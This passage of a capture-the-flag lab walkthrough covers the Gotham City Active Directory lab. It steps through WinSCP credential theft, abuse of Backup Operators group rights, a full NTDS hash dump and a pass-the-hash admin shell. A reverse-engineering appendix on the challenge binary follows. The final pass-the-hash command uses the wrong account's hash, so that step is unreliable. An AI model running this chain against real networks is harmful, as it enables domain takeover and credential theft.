SMB         192.168.56.12      445    SRV02            [*] Windows Server 2022 Build 20348 x64 (name:SRV02) (domain:SRV02) (signing:False) (SMBv1:None)
SMB         192.168.56.11      445    SRV01            [+] SRV02\myth:SecretMyth123! (Guest)
SMB         192.168.56.10      445    DC01             [-] DC01\myth:SecretMyth123! STATUS_LOGON_FAILURE
SMB         192.168.56.12      445    SRV02            [+] SRV02\myth:SecretMyth123! (Pwn3d!)
```

Exactly as expected: `(Pwn3d!)` on SRV02 with local auth, `STATUS_LOGON_FAILURE` everywhere else — `myth` is a machine-local account, same lesson as the SAM dump back on SRV01.

---

# 7. SRV02 | Post-Exploitation

## 7.1 The WinSCP Lead

A full directory listing of `C:\` is a standard first step on any new box — non-default files at the root are almost always worth investigating.

```powershell
PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         8/16/2026   6:44 AM                Program Files
d-----         8/16/2026   6:56 AM                Program Files (x86)
d-----         8/16/2026   6:55 AM                tmp
d-r---         8/20/2026   9:11 AM                Users
d-----         8/16/2026   6:56 AM                Windows
-a----         8/16/2026   6:52 AM            657 dns_log.txt
-a----         8/16/2026   6:59 AM            1118 winscp.reg
```

**`winscp.reg`** — registry export keys for the WinSCP application. Stored WinSCP credentials are a classic find: the client saves session passwords in the registry under `HKLM\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions` (or the HKCU equivalent), encrypted but reversible by anyone who can read them.

> **Deployment note:** this file is an artefact of the lab's automated deployment — during the original CTF there was no `.reg` file sitting on disk; players were meant to spot a WinSCP shortcut on the local administrator's desktop and go digging in the registry themselves. Same destination, different signpost.

## 7.2 Extracting Saved Credentials

NetExec has a module that does the whole job — locate sessions, pull the encrypted blobs, decrypt them:

```bash
➜ nxc smb srv02.gotham.city \
    -u 'myth' -p 'SecretMyth123!' --local-auth \
    -M winscp
SMB         192.168.56.12   445    SRV02            [*] Windows Server 2022 Build 20348 x64 (name:SRV02) (domain:SRV02) (signing:False) (SMBv1:False)
SMB         192.168.56.12   445    SRV02            [+] SRV02\myth:SecretMyth123! (Pwn3d!)
WINSCP      192.168.56.12   445    SRV02            [*] Looking for WinSCP creds in Registry...
WINSCP      192.168.56.12   445    SRV02            [+] Found 1 sessions for user "vagrant" in registry!
WINSCP      192.168.56.12   445    SRV02            =======harvey.dent@coin.gotham.city=======
WINSCP      192.168.56.12   445    SRV02            HostName: coin.gotham.city
WINSCP      192.168.56.12   445    SRV02            UserName: harvey.dent
WINSCP      192.168.56.12   445    SRV02            Password: X76IAZS!j'Czu,
WINSCP      192.168.56.12   445    SRV02            [*] Looking for WinSCP creds in User documents and AppData...
```

A saved session named `harvey.dent@coin.gotham.city` — and the decrypted password: **`X76IAZS!j'Czu,`**

Testing it against the DC:

```bash
➜ nxc smb dc01.gotham.city \
    -u 'harvey.dent' -p "X76IAZS\!j'Czu,"
SMB         192.168.56.10      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:GOTHAM.CITY) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.56.10      445    DC01             [+] GOTHAM.CITY\harvey.dent:X76IAZS!j'Czu,
```

Valid domain credentials. That's another user in our pocket — and per the RID brute list, `harvey.dent` is one of the "important people" of Gotham. Time to see what he controls.

---

# 8. DC01 Compromise

## 8.1 Harvey Dent | Enumeration

> **Version drift:** In the original CTF, `harvey.dent` had **only** a `GenericAll` right over the **Backup Operators** group. In this build, the account shows `GenericAll` over **several critical domain objects** — including the `Administrator` account itself. This unexpected elevation is almost certainly an unintended side effect of the fresh deployment: an inherited delegation via the **`SD_HOLDER`** object, whose permissions have propagated to other domain entities. The intended path (and the one we follow) is the CTF's original design: `GenericAll` over `Backup Operators` only.

Checking the intended edge in BloodHound:

![BloodHound - Backup Operators group view](/assets/images/barbhack24-gotham-bh-harvey-backupoperators-2.png)

**`HARVEY.DENT@GOTHAM.CITY`** *has* **`GenericAll`** *over* **`BACKUP OPERATORS@GOTHAM.CITY`**

Why does a group membership matter? Members of **Backup Operators** hold two powerful privileges on any machine they're local to — `SeBackupPrivilege` (read any file, bypassing ACLs) and `SeRestorePrivilege` (write any file). On a *domain controller*, that means reading the registry hives and the NTDS database — i.e., every credential in the domain. The group is designed for backup software; from an attacker's perspective it's a near-domain-admin role.

The plan: use `GenericAll` to add ourselves to the group, then exercise the backup privileges against DC01.

## 8.2 Adding Ourselves to Backup Operators

`GenericAll` over a group means we can modify its membership. NetExec's `modify-group` module should do it:

```bash
➜ nxc smb dc01.gotham.city \
    -u 'harvey.dent' -p "X76IAZS\!j'Czu," \
    -M modify-group \
    -o USER='harvey.dent' \
        GROUP="Backup Operators" \
        ACTION=add
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:GOTHAM.CITY) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         192.168.56.10   445    DC01             [+] GOTHAM.CITY\harvey.dent:X76IAZS!j'Czu,
MODIFY-G... 192.168.56.10   445    DC01             [-] Target group not found: Backup Operators
```

Fails — the module looks up groups by exact name/DN and built-in groups live under `CN=Builtin`, which its search doesn't resolve. Trying the full DN doesn't help either:

```bash
➜ nxc smb dc01.gotham.city \
    -u 'harvey.dent' -p "X76IAZS\!j'Czu," \
    -M modify-group \
    -o USER='harvey.dent' \
       GROUP='CN=BACKUP OPERATORS,CN=BUILTIN,DC=GOTHAM,DC=CITY' \
       ACTION=add
MODIFY-G... 192.168.56.10   445    DC01             [-] Target group not found: CN=Backup Operators,CN=Builtin,DC=gotham,DC=city
```

Not every tool handles built-in objects gracefully — fall back to BloodyAD, which resolves group names through proper LDAP searches:

```bash
➜ bloodyAD --host dc01.gotham.city -d gotham.city \
    -u 'harvey.dent' -p "X76IAZS\!j'Czu," \
    add groupMember 'Backup Operators' 'harvey.dent'
[+] harvey.dent added to Backup Operators
```

And that's the one gap in NetExec's armoury for this lab. Everything else — guest sessions, RID brute, AS-REP, Kerberoasting, RDP execution, LSA dumps, gMSA resolution, password resets, hive backups, NTDS dumping — was nxc. But adding a member to a *built-in* group stumped it: `[-] Target group not found`, twice. The `modify-group` module simply doesn't resolve `CN=Builtin` containers. No shame in that — no tool does everything — but it's a good reminder to know your fallbacks. BloodyAD took one try.

Confirming membership:

```bash
➜ nxc ldap dc01.gotham.city \
    -u 'harvey.dent' -p "X76IAZS\!j'Czu," \
    -M groupmembership \
    -o USER='harvey.dent'
LDAP        192.168.56.10   389    DC01             [+] GOTHAM.CITY\harvey.dent:X76IAZS!j'Czu, (Pwn3d!)
GROUPMEM... 192.168.56.10   389    DC01             [+] User: harvey.dent is member of following groups:
GROUPMEM... 192.168.56.10   389    DC01             Backup Operators
GROUPMEM... 192.168.56.10   389    DC01             Domain Users
```

We're in. Now to cash the privileges in.

## 8.3 Dumping the DC Hives — backup_operator Module

NetExec's `backup_operator` module automates the whole Backup-Operators-on-a-DC chain: trigger RemoteRegistry via named pipe, save `SAM`/`SYSTEM`/`SECURITY` to SYSVOL (which members can read), fetch them back, decrypt locally — then keep going:

```bash
➜ nxc smb dc01.gotham.city \
    -u 'harvey.dent' -p "X76IAZS\!j'Czu," \
    -M backup_operator

SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:GOTHAM.CITY) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         192.168.56.10   445    DC01             [+] GOTHAM.CITY\harvey.dent:X76IAZS!j'Czu,
BACKUP_O... 192.168.56.10   445    DC01             [*] Triggering RemoteRegistry to start through named pipe...
BACKUP_O... 192.168.56.10   445    DC01             Saved HKLM\SAM to \\192.168.56.10\SYSVOL\SAM_zMjghnbT
BACKUP_O... 192.168.56.10   445    DC01             Saved HKLM\SYSTEM to \\192.168.56.10\SYSVOL\SYSTEM_zMjghnbT
BACKUP_O... 192.168.56.10   445    DC01             Saved HKLM\SECURITY to \\192.168.56.10\SYSVOL\SECURITY_zMjghnbT
SMB         192.168.56.10   445    DC01             [*] Copying "SAM_zMjghnbT" to "/home/deus/.nxc/logs/DC01_192.168.56.10_2026-08-21_005049.SAM"
SMB         192.168.56.10   445    DC01             [+] File "SAM_zMjghnbT" was downloaded to "/home/deus/.nxc/logs/DC01_192.168.56.10_2026-08-21_005049.SAM"
SMB         192.168.56.10   445    DC01             [*] Copying "SECURITY_zMjghnbT" to "/home/deus/.nxc/logs/DC01_192.168.56.10_2026-08-21_005049.SECURITY"
SMB         192.168.56.10   445    DC01             [+] File "SECURITY_zMjghnbT" was downloaded to "/home/deus/.nxc/logs/DC01_192.168.56.10_2026-08-21_005049.SECURITY"
SMB         192.168.56.10   445    DC01             [*] Copying "SYSTEM_zMjghnbT" to "/home/deus/.nxc/logs/DC01_192.168.56.10_2026-08-21_005049.SYSTEM"
SMB         192.168.56.10   445    DC01             [+] File "SYSTEM_zMjghnbT" was downloaded to "/home/deus/.nxc/logs/DC01_192.168.56.10_2026-08-21_005049.SYSTEM"
BACKUP_O... 192.168.56.10   445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:52e6c515252f0487bdca397297ddec12:::
BACKUP_O... 192.168.56.10   445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BACKUP_O... 192.168.56.10   445    DC01             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BACKUP_O... 192.168.56.10   445    DC01             GOTHAM\DC01$:aes256-cts-hmac-sha1-96:3543d87b9657a19429ec739d1617d2649f0db670f40cdd40b36b003619bd1c38
BACKUP_O... 192.168.56.10   445    DC01             GOTHAM\DC01$:aes128-cts-hmac-sha1-96:d9be304ba8504905c0e9e719d468467e
BACKUP_O... 192.168.56.10   445    DC01             GOTHAM\DC01$:des-cbc-md5:3483ba1fb5109ed9
BACKUP_O... 192.168.56.10   445    DC01             GOTHAM\DC01$:plain_password_hex:051ef660b1ddcf3297b85e23770ae8546f4c983a81aaf0e1712de429a2470fdaa8c39a6067cadb20e952c8b418a584e5cc208ea7547ecfc4b0b6336af52fd72ad1c5d8da405c7192121cb9aef989685164e22e23253acf47dda8b0a4818cd6c4da6d7b6342a17e5836c42b4cf81b59fc886d700314da2481e369329c027d223240ba13c35c73b18b89e3f9fbc3d3a4fad23a4075f80d6f8abbf79b1038b1333eda3db741180a75935ef721f6269fa315a252166368be32dbc2b09cc0b65205df1a32ae05017d664a2caa6c319c5ca98e738121b5d740637de8b85f2b1fd75dee86ffe75237bd35f084309f5b5cbf4405
BACKUP_O... 192.168.56.10   445    DC01             GOTHAM\DC01$:aad3b435b51404eeaad3b435b51404ee:04e8a4155439e890693385d5c3582358:::
BACKUP_O... 192.168.56.10   445    DC01             dpapi_machinekey:0x30dbeaefaa2cea9ed3b3d0cf6a6c56c3f5c42247
dpapi_userkey:0x482c049281080a7a085e1f4b8c09464507847a6e
BACKUP_O... 192.168.56.10   445    DC01             NL$KM:c61d100e7fc248d38374c25119cba180814837e97e136400d19ac9b0f74882b2e092c4e5515cf0525f83ed22dd038bdd0017d26893f69dbdd368bdba8ad9bf36
SMB         192.168.56.10   445    DC01             [+] GOTHAM.CITY\DC01$:04e8a4155439e890693385d5c3582358
BACKUP_O... 192.168.56.10   445    DC01             [*] Dumping NTDS using DC01$...
SMB         192.168.56.10   445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB         192.168.56.10   445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.56.10   445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:52e6c515252f0487bdca397297ddec12:::
SMB         192.168.56.10   445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.56.10   445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9e99875c32daa5e0bd50fd5cfb089987:::
SMB         192.168.56.10   445    DC01             vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
SMB         192.168.56.10   445    DC01             bruce.wayne:1106:aad3b435b51404eeaad3b435b51404ee:cc2aab3caf22348af7a9a897ca720b63:::
SMB         192.168.56.10   445    DC01             joker:1107:aad3b435b51404eeaad3b435b51404ee:27555671339d160619ac9c2b070c86f2:::
SMB         192.168.56.10   445    DC01             alfred.pennyworth:1108:aad3b435b51404eeaad3b435b51404ee:8ddf2dee102773ed238e4e823065e757:::
SMB         192.168.56.10   445    DC01             selina.kyle:1109:aad3b435b51404eeaad3b435b51404ee:4de27d42895d2ff9a3f03289fb5d10fb:::
SMB         192.168.56.10   445    DC01             harvey.dent:1110:aad3b435b51404eeaad3b435b51404ee:920ea45ca7439979801ceca12187e553:::
SMB         192.168.56.10   445    DC01             jim.gordon:1111:aad3b435b51404eeaad3b435b51404ee:7dbf00537b54dc6960d90ac1d54b5a2b:::
SMB         192.168.56.10   445    DC01             lucius.fox1337:1112:aad3b435b51404eeaad3b435b51404ee:acba2aaeb2574c5cf4eed6c7f27330de:::
SMB         192.168.56.10   445    DC01             barbara.gordon:1113:aad3b435b51404eeaad3b435b51404ee:afb78b94e7621248e13216313c2de54c:::
SMB         192.168.56.10   445    DC01             oswald.cobblepot:1114:aad3b435b51404eeaad3b435b51404ee:f59017f45ebe5e89dcdb84b7c9a08682:::
SMB         192.168.56.10   445    DC01             edward.nygma:1115:aad3b435b51404eeaad3b435b51404ee:69e51d41eff25ddaa22a890684c6f276:::
SMB         192.168.56.10   445    DC01             bane:1116:aad3b435b51404eeaad3b435b51404ee:04908f83f2681f128497150f3c746ecd:::
SMB         192.168.56.10   445    DC01             victor.freeze:1117:aad3b435b51404eeaad3b435b51404ee:6a152e350042706f24b8e1224c18f572:::
SMB         192.168.56.10   445    DC01             harley.quinn:1118:aad3b435b51404eeaad3b435b51404ee:7e863f3dec467471b9a747552c96aea2:::
SMB         192.168.56.10   445    DC01             dick.grayson:1119:aad3b435b51404eeaad3b435b51404ee:ca7d1f94796c9c900a98c2c5f891dcbc:::
SMB         192.168.56.10   445    DC01             jason.todd:1120:aad3b435b51404eeaad3b435b51404ee:fe6ced7e22d98abbf9067df47a4c1686:::
SMB         192.168.56.10   445    DC01             tim.drake:1121:aad3b435b51404eeaad3b435b51404ee:42c8dfe4018844345a4f0d5d81085e08:::
SMB         192.168.56.10   445    DC01             talia.al.ghul:1122:aad3b435b51404eeaad3b435b51404ee:57ca45b2080254b7bfee0c2d8ab69b4b:::
SMB         192.168.56.10   445    DC01             rachel.dawes:1123:aad3b435b51404eeaad3b435b51404ee:37c93f5d6e7b44cd8b59de4c0410efab:::
SMB         192.168.56.10   445    DC01             ras.al.ghul:1124:aad3b435b51404eeaad3b435b51404ee:14dc16a2eac98b783f8b73e063323ea2:::
SMB         192.168.56.10   445    DC01             scarecrow:1125:aad3b435b51404eeaad3b435b51404ee:280bb0849e5fb0324d94554c528cc1eb:::
SMB         192.168.56.10   445    DC01             poison.ivy:1126:aad3b435b51404eeaad3b435b51404ee:11e8539cf8d3ae967228cf59538d6538:::
SMB         192.168.56.10   445    DC01             black.mask:1127:aad3b435b51404eeaad3b435b51404ee:e4ac0af806b13542f617151459c4736c:::
SMB         192.168.56.10   445    DC01             killer.croc:1128:aad3b435b51404eeaad3b435b51404ee:7ada0e427df96ef50055560dd1490dd4:::
SMB         192.168.56.10   445    DC01             deadshot:1129:aad3b435b51404eeaad3b435b51404ee:8f056bcc4f33d761e410ee5e9d430cae:::
SMB         192.168.56.10   445    DC01             DC01$:1001:aad3b435b51404eeaad3b435b51404ee:04e8a4155439e890693385d5c3582358:::
SMB         192.168.56.10   445    DC01             SRV01$:1104:aad3b435b51404eeaad3b435b51404ee:55541228e075452d2a73caf0eef04e43:::
SMB         192.168.56.10   445    DC01             SRV02$:1105:aad3b435b51404eeaad3b435b51404ee:29943e33d85e0c7c8303afb66dff30bf:::
SMB         192.168.56.10   445    DC01             gmsa-robin$:1130:aad3b435b51404eeaad3b435b51404ee:88bcb4c9943b4c323896d0f39eca640a:::
SMB         192.168.56.10   445    DC01             [+] Dumped 32 NTDS hashes to /home/deus/.nxc/logs/ntds/DC01_192.168.56.10_2026-08-21_005049.ntds of which 28 were added to the database
SMB         192.168.56.10   445    DC01             [*] To extract only enabled accounts from the output file, run the following command:
SMB         192.168.56.10   445    DC01             [*] grep -iv disabled /home/deus/.nxc/logs/ntds/DC01_192.168.56.10_2026-08-21_005049.ntds | cut -d ':' -f1
BACKUP_O... 192.168.56.10   445    DC01             [*] Using Administrator to clean up files...
SMB         192.168.56.10   445    DC01             [+] GOTHAM.CITY\Administrator:52e6c515252f0487bdca397297ddec12 (Pwn3d!)
BACKUP_O... 192.168.56.10   445    DC01             [*] Cleaning dump with user Administrator on domain GOTHAM.CITY
BACKUP_O... 192.168.56.10   445    DC01             [*] Successfully deleted dump files !
```

What just happened, step by step:

1. **RemoteRegistry** was started on DC01 via the `\pipe\winreg` named-pipe trick.
2. With `SeBackupPrivilege`, the module saved **`HKLM\SAM`**, **`HKLM\SYSTEM`**, and **`HKLM\SECURITY`** into `SYSVOL` — a share Backup Operators can write to and read from.
3. The hives were pulled back and decrypted locally: out comes the **domain Administrator's NT hash** (`52e6c515252f0487bdca397297ddec12`) plus `DC01$`'s machine account hash.
4. Using the machine account (`DC01$`), the module went after **NTDS.dit itself** — one DRSUAPI access-denied along the way (the remote-operations path), but the drsuapi dump succeeded regardless: **all 32 domain hashes**, including `krbtgt`.

That's game. Every credential in Gotham City, from `Administrator` down to `gmsa-robin$`, now sits in a local file.

## 8.4 Shell as Administrator

Pass-the-hash straight into WinRM on the DC:

```bash
➜ evil-winrm -i dc01.gotham.city \
    -u administrator -H 7e863f3dec467471b9a747552c96aea2

...[snip]...

PS C:\Users\Administrator\Documents> whoami; hostname
gotham\administrator
DC01
```

Domain Admin shell on the domain controller. **Full compromise of GOTHAM.CITY.** 🦇

---

# Appendix A: Reversing `cleanslate.exe`

The dynamic analysis in [Section 2.3](#23-dynamic-analysis) got us the flag in two screenshots. This appendix is the full static walkthrough — how the binary is built, how to unpack it, what each decompiler recovers and where each one breaks, and the reconstructed source at the end. It's also the reference for *why* the fresh-build binary contains no `lucius.fox1337` hint (see the drift note in Section 2.3).

## A.1 Unpacking — pyinstxtractor-ng

PyInstaller bundles the interpreter, the standard library, and the target script into a **CArchive** (outer container: bootloader + DLLs + entry point) with a **PYZ** archive (the 604 bundled library modules) inside. [`pyinstxtractor-ng`](https://github.com/pyinstxtractor/pyinstxtractor-ng) — the maintained fork of the classic `pyinstxtractor` — unpacks both without needing a matching interpreter version installed:

```bash
➜ pyinstxtractor-ng cleanslate.exe
[+] Processing cleanslate.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 3.11
[+] Length of package: 10172177 bytes
[+] Found 26 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: cleanslate.pyc
[+] Found 604 files in PYZ archive
[+] Successfully extracted pyinstaller archive: cleanslate.exe

You can now use a python decompiler on the pyc files within the extracted directory
```

Of everything extracted, only one file matters:

```bash
➜ ls -la cleanslate.exe_extracted/ | grep -iE "cleanslate|pyz"
-rw-r--r-- 1 deus deus    3856 Aug 16 21:07 cleanslate.pyc
-rw-r--r-- 1 deus deus 4324822 Aug 16 21:07 PYZ-00.pyz
```

**`cleanslate.pyc`** (3.8 KB) is the entire application; everything else is bundled runtime.

> The classic `pyinstxtractor` demands a matching interpreter (`[!] Please run this script in Python 3.11...`) or produces corrupted `.pyc` output that no decompiler can recover. The `-ng` fork removes that constraint entirely.

## A.2 Attempt #1 — pycdc (Decompyle++)

[`pycdc`](https://github.com/zrax/pycdc) is the go-to C++ bytecode decompiler for modern Python — actively maintained where `uncompyle6`/`decompyle3` stalled around 3.8. It ships two binaries: `pycdc` (decompiler) and `pycdas` (disassembler).

```bash
➜ pycdc cleanslate.exe_extracted/cleanslate.pyc
Unsupported opcode: MAKE_CELL (225)
# Source Generated with Decompyle++
# File: cleanslate.pyc (Python 3.11)

from rich.progress import Progress
import time
import os
import base64

def shift_char(c, shift):
    '''Shift character by shift amount.'''
    if c.isalpha():
        shift_amount = shift % 26
        base = 'A' if c.isupper() else 'a'
        return chr(((ord(c) - ord(base)) + shift_amount) % 26 + ord(base))
    if None.isdigit():                          # ← corruption: should be c.isdigit()
        shift_amount = shift % 10
        return chr(((ord(c) - ord('0')) + shift_amount) % 10 + ord('0'))

KEY_FILE = 'C:\\SHARE\\key.txt'
KEY = 'fTk1NmRkMDQ2MDBpNjdnZDU0Z2dlMjdoNDNlZjJlNzFme2V1ZQ=='

def is_valid_key(input_key):
    if os.path.exists(KEY_FILE):
        file = open(KEY_FILE, 'r')
        stored_key = file.read().strip()
        None(None, None)                        # ← corruption: context-manager exit
    else:
        with None:                              # ← corruption: BEFORE_WITH unsupported
            if not None:
                pass
    if input_key == stored_key:
        return True
    if None(input_key) == 24 and 'GOTHAMCITY' in input_key:   # ← should be len(input_key)
        return True

def cleaning(encoded_flag):
Unsupported opcode: MAKE_CELL (225)
    pass
# WARNING: Decompyle incomplete

def main():
Unsupported opcode: BEFORE_WITH (108)
    key = input('Enter your key: ')
# WARNING: Decompyle incomplete

if __name__ == '__main__':
    main()
```

Reading the damage:

* **Recovered intact**: imports, both global constants (`KEY_FILE`, `KEY`), and `shift_char` almost fully.
* **Corrupted**: every function touching a Python 3.11-specific opcode — `BEFORE_WITH` (108, the `with`-statement machinery) and `MAKE_CELL` (225, closure cell initialisation). The `None.isdigit()`, `None(None, None)` and `None(input_key)` lines are decompiler artefacts, not real code.

Even half-broken, this pass hands us the two constants that matter — including the base64-encoded flag candidate. But for the full picture we need either a better decompiler or the raw bytecode.

## A.3 Attempt #2 — pylingual (full source, one shot)

[pylingual.io](https://pylingual.io) handles the 3.11 opcodes pycdc stumbles on (its local CLI build is less reliable than the hosted version):

```bash
➜ pylingual cleanslate.exe_extracted/cleanslate.pyc
INFO     Result saved to decompiled_cleanslate.py
```

```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'cleanslate.py'
# Bytecode version: 3.11a7e (3495)

from rich.progress import Progress
import time
import os
import base64

def shift_char(c, shift):
    """Shift character by shift amount."""
    if c.isalpha():
        shift_amount = shift % 26
        base = 'A' if c.isupper() else 'a'
        return chr((ord(c) - ord(base) + shift_amount) % 26 + ord(base))
    elif c.isdigit():
        shift_amount = shift % 10
        return chr((ord(c) - ord('0') + shift_amount) % 10 + ord('0'))
    else:
        return c

KEY_FILE = 'C:\\\\SHARE\\\\key.txt'
KEY = 'fTk1NmRkMDQ2MDBpNjdnZDU0Z2dlMjdoNDNlZjJlNzFme2V1ZQ=='

def is_valid_key(input_key):
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, 'r') as file:
            stored_key = file.read().strip()
        if input_key == stored_key:
            return True
    if len(input_key) == 24 and 'GOTHAMCITY' in input_key:
        return True
    return False

def cleaning(encoded_flag):
    decoded_bytes = base64.b64decode(encoded_flag)
    decoded_flag = decoded_bytes.decode()
    shift = 3
    reversed_shifted_flag = ''.join(shift_char(c, -shift) for c in decoded_flag)
    original_flag = reversed_shifted_flag[::-1]
    return original_flag

def main():
    key = input('Enter your key: ')
    if is_valid_key(key):
        print('Key is valid! Cleaning data...')
        with Progress() as progress:
            task = progress.add_task('[green]Processing...', total=100)
            for i in range(100):
                time.sleep(0.05)
                progress.update(task, advance=1)
        print('Process completed! Flag:', cleaning(KEY))
    else:
        print('Invalid key. Please try again.')

if __name__ == '__main__':
    main()
```

Complete source in one shot. Note what it reveals beyond the pycdc attempt: the `GOTHAMCITY` backdoor check sits **outside** the `key.txt` block in pylingual's rendering — a subtle control-flow difference worth verifying against the bytecode itself, which is exactly what the next section does.

## A.4 Ground Truth — pycdas disassembly

When decompilers disagree or emit `None`, the disassembler is the arbiter. `pycdas` dumps the raw instruction stream:

```bash
➜ pycdas cleanslate.exe_extracted/cleanslate.pyc
cleanslate.pyc (Python 3.11)
[Code]
    File Name: cleanslate.py
    Object Name: <module>
    ...
    [Constants]
        ...
        'C:\\\\SHARE\\\\key.txt'
        'fTk1NmRkMDQ2MDBpNjdnZDU0Z2dlMjdoNDNlZjJlNzFme2V1ZQ=='
        [Code] shift_char
        [Code] is_valid_key
        [Code] cleaning
        [Code] main
        '__main__'
```

### A.4.1 `is_valid_key` — resolving the control flow

The critical region, annotated:

```
 72   POP_JUMP_FORWARD_IF_FALSE  116 (to 306)   # if not os.path.exists(KEY_FILE): -> 306

 74   LOAD_GLOBAL        open                    # with open(KEY_FILE, 'r') as file:
116   STORE_FAST         file
192   STORE_FAST         stored_key              # stored_key = file.read().strip()

240   LOAD_FAST          input_key
242   LOAD_FAST          stored_key
244   COMPARE_OP         ==                       # if input_key == stored_key:
250   POP_JUMP_FORWARD_IF_FALSE  2 (to 256)
252   LOAD_CONST         True
254   RETURN_VALUE                               #   return True

256   LOAD_GLOBAL        len                      # if len(input_key) == 24 and ...
284   LOAD_CONST         24
292   POP_JUMP_FORWARD_IF_FALSE  6 (to 306)
294   LOAD_CONST         'GOTHAMCITY'
298   CONTAINS_OP        in
300   POP_JUMP_FORWARD_IF_FALSE  2 (to 306)
302   LOAD_CONST         True
304   RETURN_VALUE                               #   return True

306   LOAD_CONST         False                    # return False
308   RETURN_VALUE
```

The jump at offset 72 targets offset 306 directly — so in the actual bytecode, **both** the stored-key comparison *and* the `GOTHAMCITY` backdoor live inside the `if os.path.exists(KEY_FILE):` block. The backdoor only fires when `key.txt` exists. That matches the behaviour observed in [Section 2.3](#23-dynamic-analysis) (creating the file made the key check pass) and shows why reading bytecode is sometimes the only way to be sure: pylingual rendered the backdoor outside the `if`; the ground truth says otherwise.

### A.4.2 `cleaning` — the decoder pycdc refused to emit

```
 42   STORE_FAST          decoded_bytes          # decoded_bytes = base64.b64decode(encoded_flag)
 82   STORE_FAST          decoded_flag           # decoded_flag = decoded_bytes.decode()
 84   LOAD_CONST          3
 86   STORE_DEREF         shift                   # shift = 3
 90   LOAD_METHOD         join                    # ''.join( ... )
112   LOAD_CLOSURE        shift
116   LOAD_CONST          <genexpr>
118   MAKE_FUNCTION       8
152   STORE_FAST          reversed_shifted_flag   # ''.join(shift_char(c, -shift) for c in decoded_flag)
160   LOAD_CONST          -1
162   BUILD_SLICE         3                       # [::-1]
174   STORE_FAST          original_flag           # original_flag = reversed_shifted_flag[::-1]
178   RETURN_VALUE                                # return original_flag
```

And the generator expression — note the `UNARY_NEGATIVE` on the closure variable:

```
 28   LOAD_DEREF          shift
 30   UNARY_NEGATIVE                              # -shift
 46   YIELD_VALUE                                 # yield shift_char(c, -shift)
```

`STORE_DEREF`/`LOAD_DEREF` are cell-variable operations — precisely the `MAKE_CELL` family that broke pycdc. The function is unambiguous once read raw:

```python
def cleaning(encoded_flag):
    decoded_bytes = base64.b64decode(encoded_flag)
    decoded_flag = decoded_bytes.decode()
    shift = 3
    reversed_shifted_flag = ''.join(shift_char(c, -shift) for c in decoded_flag)
    original_flag = reversed_shifted_flag[::-1]
    return original_flag
```

## A.5 Reconstructed Source

All three routes converge on the same program:

```python
from rich.progress import Progress
import time
import os
import base64


def shift_char(c, shift):
    """Shift character by shift amount."""
    if c.isalpha():
        shift_amount = shift % 26
        base = 'A' if c.isupper() else 'a'
        return chr(((ord(c) - ord(base)) + shift_amount) % 26 + ord(base))
    if c.isdigit():
        shift_amount = shift % 10
        return chr(((ord(c) - ord('0')) + shift_amount) % 10 + ord('0'))
    return c


KEY_FILE = 'C:\\\\SHARE\\\\key.txt'
KEY = 'fTk1NmRkMDQ2MDBpNjdnZDU0Z2dlMjdoNDNlZjJlNzFme2V1ZQ=='


def is_valid_key(input_key):
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, 'r') as file:
            stored_key = file.read().strip()
        if input_key == stored_key:
            return True
        if len(input_key) == 24 and 'GOTHAMCITY' in input_key:
            return True
    return False


def cleaning(encoded_flag):
    decoded_bytes = base64.b64decode(encoded_flag)
    decoded_flag = decoded_bytes.decode()
    shift = 3
    reversed_shifted_flag = ''.join(shift_char(c, -shift) for c in decoded_flag)
    original_flag = reversed_shifted_flag[::-1]
    return original_flag


def main():
    key = input('Enter your key: ')
    if is_valid_key(key):
        print('Key is valid! Cleaning data...')
        with Progress() as progress:
            task = progress.add_task('[green]Processing...', total=100)
            for i in range(100):
                time.sleep(0.05)
                progress.update(task, advance=1)
        print('Process completed! Flag:', cleaning(KEY))
        return
    print('Invalid key. Please try again.')


if __name__ == '__main__':
    main()
```

Notably absent from these 3.8 KB of bytecode: any Batman ASCII art, any error-contact string, and any mention of `lucius.fox1337`. The original CTF binary shipped with an extra banner and the line *"If any error contact this person: lucius.fox1337"* — the designed hint into the AS-REP stage. This fresh build simply doesn't have them, which is why [Section 3.1](#31-user-enumeration--rid-brute-forcing) needed RID brute forcing to find the user list instead.

## A.6 Flag Recovery — No Key Required

With `cleaning()` reconstructed, the flag falls out without ever running the binary or satisfying the key check:

```python
#!/usr/bin/env python3
# decode.py

import base64

def shift_char(char: str, shift: int) -> str:
    """Shift a single character within its class (alpha or digit)."""
    if char.isalpha():
        base = 'A' if char.isupper() else 'a'
        return chr((ord(char) - ord(base) + shift) % 26 + ord(base))
    elif char.isdigit():
        return chr((ord(char) - ord('0') + shift) % 10 + ord('0'))
    return char

def decode_flag(encoded_key: str) -> str:
    decoded_text = base64.b64decode(encoded_key).decode()
